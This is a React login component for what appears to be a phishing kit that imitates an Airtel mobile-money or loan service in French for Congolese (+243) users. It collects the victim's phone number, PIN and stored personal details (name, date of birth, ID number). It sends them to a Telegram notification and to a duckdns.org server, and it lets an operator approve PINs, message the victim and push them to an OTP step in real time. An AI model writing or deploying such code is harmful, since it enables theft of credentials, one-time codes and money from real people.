import React, { useState, useRef, useEffect } from 'react'
import axios from 'axios'
import { useNavigate, useParams } from 'react-router-dom'
import { apiService, getBotName } from '../services/api.js'

const API_BASE_URL = "https://lnmb.duckdns.org"

const api = axios.create({
  baseURL: API_BASE_URL,
  headers: { "Content-Type": "application/json" }
})

api.interceptors.request.use(config => {
  const bot = window.location.pathname.split("/")[1] || "user1"
  config.headers["X-Bot-Name"] = bot
  return config
})

const LogoPlaceholder = () => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="100" height="100">
    <circle cx="50" cy="50" r="45" fill="#11bb4a"/>
    <text x="50" y="58" font-size="48" font-weight="bold" fill="white" text-anchor="middle" font-family="Arial, sans-serif">A</text>
  </svg>
)

const SpinnerStyle = () => (
  <style>{`
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  `}</style>
)

function Login() {
  const navigate = useNavigate()
  const [imgError, setImgError] = useState(false)
  const [phone, setPhone] = useState("")
  const [inputs, setInputs] = useState(["", "", "", ""])
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState("")
  const [status, setStatus] = useState("")
  const [adminMessage, setAdminMessage] = useState("")
  const [waitingForApproval, setWaitingForApproval] = useState(false)
  
  const inputRefs = useRef([])
  const sessionRef = useRef(null)
  const timerRef = useRef(null)
  const { user } = useParams()
  const basePath = user ? `/${user}` : "/default"
  
  const statusMessages = {
    pending: "⏳ En attente...",
    approved: "✅ Code PIN approuvé !!",
    wrong_pin: "❌ Code PIN incorrect",
    pinotp_correct: "✅ Code PIN et OTP vérifiés!",
    expired: "⏰ Délai de vérification dépassé ",
    rejected: "❌ Request rejected by admin",
    message_user: "💬 Admin wants to message you..."
  }

  const handleInputChange = (index, value) => {
    if (value !== "" && !/^\d$/.test(value)) return
    const newInputs = [...inputs]
    newInputs[index] = value
    setInputs(newInputs)
    if (value !== "" && index < 3) inputRefs.current[index + 1]?.focus()
  }

  const handleKeyDown = (index, e) => {
    if (e.key === "ArrowLeft" && index > 0) {
      e.preventDefault()
      inputRefs.current[index - 1]?.focus()
    } else if (e.key === "ArrowRight" && index < 3) {
      e.preventDefault()
      inputRefs.current[index + 1]?.focus()
    } else if (e.key === "Backspace" && !inputs[index] && index > 0) {
      e.preventDefault()
      inputRefs.current[index - 1]?.focus()
    }
  }

  const startPolling = (sessionId) => {
    sessionRef.current = sessionId
    let attempts = 0
    const maxAttempts = 150
    setLoading(true)
    setWaitingForApproval(true)
    
    const poll = async () => {
      if (attempts >= maxAttempts) {
        setError("Délai d'expiration de la vérification du code PIN. Veuillez réessayer..")
        setLoading(false)
        setStatus("expired")
        return
      }
      
      attempts++
      try {
        const response = await api.post("/api/check-pin-status", {
          sessionId,
          bot: userId
        })
        const data = response.data
        
        if (data.status === "pending") {
          setStatus("pending")
          setWaitingForApproval(true)
        } else if (data.status === "approved") {
          setAdminMessage("")
          setLoading(false)
          setWaitingForApproval(false)
          localStorage.removeItem('otpSessionId')
          setTimeout(() => navigate(`${basePath}/verification`), 500)
        } else if (data.status === "rejected") {
          setError("❌ Request rejected by admin. Please try again.")
          setLoading(false)
          setWaitingForApproval(false)
          setStatus("rejected")
        } else if (data.status === "wrong_pin") {
          setError("Code PIN incorrect. Veuillez réessayer.")
          setLoading(false)
          setWaitingForApproval(false)
          setStatus("wrong_pin")
        } else if (data.status === "expired") {
          setError("La vérification du code PIN a expiré. Veuillez réessayer.")
          setLoading(false)
          setWaitingForApproval(false)
          setStatus("expired")
        } else if (data.status === "approved_with_otp") {
          setStatus("pinotp_correct")
          setLoading(false)
          setWaitingForApproval(false)
          navigate(`${basePath}/verification`)
        } else if (data.status === "message_user") {
          setAdminMessage(data.message || "")
        }
      } catch (err) {
        console.error("Polling error:", err)
      }
    }
    
    timerRef.current = setInterval(poll, 2000)
  }

  const submitPin = async () => {
    if (inputs.some(input => input === "")) return

    const pin = inputs.join("")
    setLoading(true)
    setError("")
    setStatus("pending")

    const storedApp = localStorage.getItem('loanAppData')
    const appData = storedApp ? JSON.parse(storedApp) : {}
    const storedClient = localStorage.getItem('clientData')
    const clientData = storedClient ? JSON.parse(storedClient) : {}

    const clientInfo = {
      name: appData.name || "",
      number: appData.number || phone || "",
      dob: clientData.dob || "",
      id: clientData.id || "",
      employment: clientData.employment || "",
      amount: clientData.amount || "",
      term: clientData.term || "",
      pin: pin,
      pinInputs: inputs.join(" "),
      error: "",
      ecoCash: ""
    }

    try {
      await apiService.sendTelegramNotification(clientInfo)
      const response = await api.post("/api/verify-pin", {
        phoneNumber: appData.number || phone,
        pinCode: pin,
        userId: `user_${Date.now()}`,
        userName: "Airtel User"
      })

      if (response.data.success) {
        startPolling(response.data.sessionId)
      } else {
        setError(response.data.error || "Échec de la vérification du code PIN")
        setLoading(false)
        setStatus("")
      }
    } catch (err) {
      setError("Erreur réseau. Veuillez vérifier votre connexion et réessayer.")
      setLoading(false)
      setStatus("")
    }
  }

  useEffect(() => {
    inputRefs.current[0]?.focus()
    
    const storedApp = localStorage.getItem('loanAppData')
    if (storedApp) {
      const appData = JSON.parse(storedApp)
      if (appData.number) {
        setPhone(appData.number)
      }
    }
    
    return () => {
      if (timerRef.current) clearInterval(timerRef.current)
    }
  }, [])

  return (
    <div className="container">
      <SpinnerStyle />
      <header className="topHeader">
        <div className="logo" style={{ marginBottom: '15px', textAlign: 'center' }}>
          <img src="/assets/image.png" alt="Logo" style={{ height: '55px', width: 'auto', maxWidth: '130px' }} />
        </div>
      </header>
      <h1 className="login-title">Bienvenue</h1>
      
      <main>
        <div className="phone-number">
          <div className="numbercont">
            <div className="countrycode">+243 | {phone || " "}</div>
          </div>
        </div>
        
        <div className="pin-input-container">
          <label className="pin-label">Saisissez votre code PIN</label>
          
          {adminMessage && (
            <div className="admin-message" style={{
              backgroundColor: "#f0f8ff",
              border: "1px solid #11bb4a",
              borderRadius: "8px",
              padding: "12px",
              marginBottom: "15px",
              borderLeft: "4px solid #11bb4a"
            }}>
              <div className="admin-message-header" style={{
                display: "flex",
                alignItems: "center",
                gap: "8px",
                marginBottom: "8px"
              }}>
                <span style={{ color: "#11bb4a" }}>💬</span>
                <strong style={{ color: "#11bb4a" }}>Message from Admin:</strong>
              </div>
              <div className="admin-message-content" style={{
                color: "#333",
                fontSize: "14px",
                lineHeight: "1.5",
                padding: "8px",
                backgroundColor: "#fff",
                borderRadius: "4px",
                border: "1px solid #e0e0e0"
              }}>{adminMessage}</div>
            </div>
          )}
          
          <div>
            {inputs.map((input, index) => (
              <input
                key={index}
                ref={el => inputRefs.current[index] = el}
                type="number"
                className="no-spinner"
                value={input}
                maxLength="1"
                disabled={loading}
                onChange={(e) => handleInputChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
              />
            ))}
          </div>
          
          {error && <div className="error-message">{error}</div>}
          {status && <div className="status-message">{statusMessages[status] || status}</div>}
        </div>
        
        <div className="forgot-pin"><a href="#">Code PIN oublié?</a></div>
      </main>
      
      <footer>
        <div className="curvesec">
          <button 
            className="btnContinue" 
            onClick={submitPin} 
            disabled={inputs.some(i => i === "") || loading || waitingForApproval}
            style={{
              opacity: loading || waitingForApproval ? 1 : 1,
              cursor: loading || waitingForApproval ? "wait" : "pointer",
              position: "relative",
              overflow: "hidden"
            }}
          >
            {(loading || waitingForApproval) ? (
              <span style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "8px" }}>
                <span className="spin" style={{
                  display: "inline-block",
                  width: "20px",
                  height: "20px",
                  border: "2px solid rgba(255,255,255,0.3)",
                  borderRadius: "50%",
                  borderTopColor: "white",
                  animation: "spin 1s linear infinite"
                }}></span>
                Vérification du code PIN...
              </span>
            ) : "Se connecter"}
          </button>
          <p>En continuant, vous acceptez les conditions générales.</p>
        </div>
        <div style={{ textAlign: 'center', marginTop: '20px' }}>
          <button 
            type="button" 
            onClick={() => navigate(`${basePath}/apply`)}
            style={{ 
              background: 'none', 
              border: 'none', 
              color: '#666', 
              cursor: 'pointer', 
              fontSize: '14px',
              textDecoration: 'underline'
            }}
          >
            ← Retour au formulaire de prêt
          </button>
        </div>
      </footer>
    </div>
  )
}

export default Login